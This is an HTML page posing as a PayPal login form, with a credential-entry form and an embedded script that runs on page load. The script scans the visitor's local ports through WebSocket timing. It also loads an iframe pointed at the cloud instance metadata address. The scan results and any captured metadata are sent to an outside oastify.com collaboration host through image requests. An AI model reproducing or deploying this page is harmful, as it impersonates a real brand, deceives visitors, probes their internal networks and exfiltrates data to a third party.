<!DOCTYPE html>
<html>
<head><title>Login - PayPal</title></head>
<body>
<h1>PayPal Login</h1>
<form>
  <input type="email" placeholder="Email">
  <input type="password" placeholder="Password">
  <button>Login</button>
</form>
<script>
const collab = "9u41m2dngv7pgaf20zxco3q4avgm4cs1.oastify.com";

// Timing-based port scan via WebSocket
const ports = [80, 443, 8000, 8080, 3000, 5432, 3306, 6379, 9200, 8888];
const results = {};

function scanPort(port) {
  return new Promise(resolve => {
    const start = Date.now();
    const ws = new WebSocket(`ws://127.0.0.1:${port}`);
    ws.onerror = () => resolve({port, time: Date.now()-start, status:'error'});
    ws.onopen = () => { ws.close(); resolve({port, time: Date.now()-start, status:'open'}); };
    setTimeout(() => { ws.close(); resolve({port, time: Date.now()-start, status:'timeout'}); }, 2000);
  });
}

Promise.all(ports.map(scanPort)).then(results => {
  const data = results.map(r => `${r.port}:${r.status}:${r.time}ms`).join(',');
  new Image().src = `http://${collab}/?portscan=${encodeURIComponent(data)}`;
});

// Also try iframe to capture internal content
const iframe = document.createElement('iframe');
iframe.src = 'http://169.254.169.254/latest/meta-data/'\;
iframe.onload = function() {
  try {
    const content = iframe.contentDocument.body.innerText;
    new Image().src = `http://${collab}/?iframe_data=${encodeURIComponent(content.substring(0,300))}`;
  } catch(e) {
    new Image().src = `http://${collab}/?iframe_err=${encodeURIComponent(e.toString())}`;
  }
};
document.body.appendChild(iframe);
</script>
</body>
</html>
